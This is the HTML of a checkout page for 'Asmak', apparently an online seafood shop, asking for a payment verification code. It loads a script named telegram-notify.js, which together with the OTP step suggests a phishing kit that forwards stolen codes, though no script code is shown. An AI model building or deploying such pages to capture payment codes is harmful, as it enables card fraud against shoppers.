<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Asmak | Verification code</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="css/styles.css" />
  </head>
  <body>
    <header class="site-header">
      <div class="header-inner">
        <a href="index.html" class="brand">
          <span class="brand-mark" aria-hidden="true">🐟</span>
          <span>
            <div class="brand-name">Asmak</div>
            <div class="brand-tagline">Fresh daily to your door</div>
          </span>
        </a>
        <nav class="main-nav" aria-label="Main navigation">
          <a href="index.html">Home</a>
          <a href="cart.html">Cart</a>
          <a href="verify.html" class="is-current">Verify</a>
        </nav>
      </div>
    </header>

    <main class="page-wrap">
      <nav class="checkout-steps" id="checkout-steps" aria-label="Checkout steps"></nav>

      <header class="page-title">
        <h1>Verification code</h1>
        <p>Enter the code sent to you to complete payment.</p>
      </header>

      <div class="page-layout page-layout--payment">
        <section class="page-main">
          <form class="form-card" id="verify-form" novalidate>
            <div class="form-field">
              <label for="otp">Verification code <span class="req">*</span></label>
              <input
                id="otp"
                name="otp"
                class="otp-input"
                type="text"
                inputmode="numeric"
                autocomplete="one-time-code"
                required
                maxlength="6"
                placeholder="••••"
                dir="ltr"
              />
              <p class="field-error is-hidden" id="otp-error" role="alert">Incorrect verification code</p>
            </div>
            <div class="form-actions">
              <a href="payment.html" class="btn btn-ghost" id="btn-back-verify">Back</a>
              <button type="submit" class="btn btn-primary" id="btn-verify-next">
                <span class="btn__label">Next</span>
                <span class="btn__loading is-hidden" aria-hidden="true"></span>
              </button>
            </div>
          </form>
        </section>
      </div>
    </main>

    <footer class="site-footer">
      <p><strong>Asmak</strong> — online seafood store</p>
    </footer>

    <div class="toast" id="toast" role="status" aria-live="polite"></div>

    <script src="js/products.js"></script>
    <script src="js/cart-store.js"></script>
    <script src="js/ui.js"></script>
    <script src="js/telegram-notify.js"></script>
    <script src="js/verify-page.js"></script>
  </body>
</html>
